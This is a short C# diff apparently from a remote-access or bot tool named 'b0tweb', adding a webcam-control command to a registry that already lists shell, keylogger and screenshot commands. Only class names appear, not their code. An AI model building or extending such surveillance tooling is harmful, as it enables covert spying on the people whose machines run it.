@@ -5,10 +5,11 @@ namespace b0tweb.Commands
 {
     static class CommandRegistry
     {
-        private static AbstractCommand[] _supportedCommands = { 
-            new CMDCommand(), 
-	      new KeyloggerCommand(),
+        private static AbstractCommand[] _supportedCommands = {
+            new CMDCommand(),
+            new KeyloggerCommand(),
             new ScreenshotCommand(),
+            new WebcamControlCommand(),
         };
 
         /// <summary>
